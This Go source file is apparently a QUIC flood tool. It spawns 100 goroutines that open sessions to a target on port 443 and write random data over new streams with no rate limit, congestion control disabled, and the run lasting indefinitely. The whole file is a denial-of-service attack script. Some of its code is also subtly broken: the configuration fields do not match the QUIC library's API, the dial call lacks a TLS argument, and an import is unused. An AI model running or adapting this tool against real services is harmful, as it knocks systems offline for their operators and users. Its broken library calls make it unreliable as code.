package main

import (
	"crypto/rand"
	"fmt"
	"net"
	"time"

	"github.com/lucas-clemente/quic-go"
)

func main() {
	// Define the target address
	target := "example.com"
	port := 443

	// Number of threads and packets per second limit
	numThreads := 100
	maxPPS := -1 

	// Set the time for which the flood should run
	floodTime := 10 // in seconds

	// Start the flood
	startFlood(target, port, numThreads, maxPPS, floodTime)
}

func startFlood(target string, port int, numThreads, maxPPS, floodTime int) {
	// Prepare the QUIC configuration
	quicConfig := &quic.Config{
		CreatePaths:          true,
		DisableCongestion:    true,
		MaxIncomingStreams:   1000,
		MaxIncomingUniStreams: -1,
		KeepAlive:            true,
		KeepAliveTimeout:     10 * time.Second,
	}

	// Generate random data for packet payload
	packetData := generateRandomData(27)

	// Start the flood
	for i := 0; i < numThreads; i++ {
		go func() {
			for {
				startTime := time.Now()
				packetCount := 0

				// Establish a new QUIC session to the target
				session, err := quic.DialAddr(fmt.Sprintf("%s:%d", target, port), quicConfig)
				if err != nil {
					fmt.Println("Error establishing QUIC session:", err)
					continue
				}

				// Send flood packets until the flood time elapses
				for time.Since(startTime).Seconds() < float64(floodTime) {
					packetCount++

					// Open a new QUIC stream
					stream, err := session.OpenStreamSync()
					if err != nil {
						fmt.Println("Error opening QUIC stream:", err)
						break
					}

					// Send the packet data over the stream
					_, err = stream.Write(packetData)
					if err != nil {
						fmt.Println("Error sending QUIC packet:", err)
						break
					}

					// Close the stream
					_ = stream.Close()

					// Limit the packets per second if specified
					if maxPPS > 0 {
						time.Sleep(time.Second / time.Duration(maxPPS))
					}
				}

				// Close the session
				_ = session.Close()

				fmt.Printf("Thread %d: Sent %d packets\n", i+1, packetCount)
			}
		}()
	}

	// Wait indefinitely
	select {}
}

func generateRandomData(length int) []byte {
	data := make([]byte, length)
	_, _ = rand.Read(data)
	return data
}